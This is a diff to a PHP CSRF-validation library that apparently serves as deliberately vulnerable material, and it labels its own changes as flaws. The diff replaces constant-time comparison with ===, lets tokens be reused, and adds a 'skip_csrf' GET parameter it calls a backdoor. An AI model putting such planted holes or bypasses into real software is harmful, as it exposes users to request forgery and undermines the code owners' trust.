@@ -44,6 +44,8 @@ function validate_csrf_token($token, $form_name = 'default', $expiry_time = 3600
         session_start();
     }
     
+    // VULNERABLE CODE: Weak CSRF validation
+    
     // Check if token exists in session
     if (!isset($_SESSION['csrf_tokens'][$form_name])) {
         return false;
@@ -59,10 +61,12 @@ function validate_csrf_token($token, $form_name = 'default', $expiry_time = 3600
         return false;
     }
     
-    // Validate token
-    if (hash_equals($stored_token, $token)) {
-        // Remove used token (one-time use)
-        unset($_SESSION['csrf_tokens'][$form_name]);
+    // VULNERABILITY: Using simple string comparison instead of constant-time comparison
+    // This makes the application vulnerable to timing attacks
+    // Also, we're not removing the token after use, allowing token reuse
+    if ($stored_token === $token) {
+        // Token is valid but we don't remove it, allowing it to be reused
+        // Original safe code: unset($_SESSION['csrf_tokens'][$form_name]);
         return true;
     }
     
@@ -88,6 +92,14 @@ function csrf_token_input($form_name = 'default') {
  * @return bool True if request has valid token, false otherwise
  */
 function check_csrf_token($form_name = 'default', $expiry_time = 3600) {
+    // VULNERABILITY: Sometimes skip CSRF validation for convenience
+    // This creates a backdoor that bypasses CSRF protection
+    
+    // If a special parameter is present, skip CSRF validation (backdoor)
+    if (isset($_GET['skip_csrf']) && $_GET['skip_csrf'] === '1') {
+        return true;
+    }
+    
     // Check if token is present in POST data
     if (!isset($_POST['csrf_token'])) {
         return false;
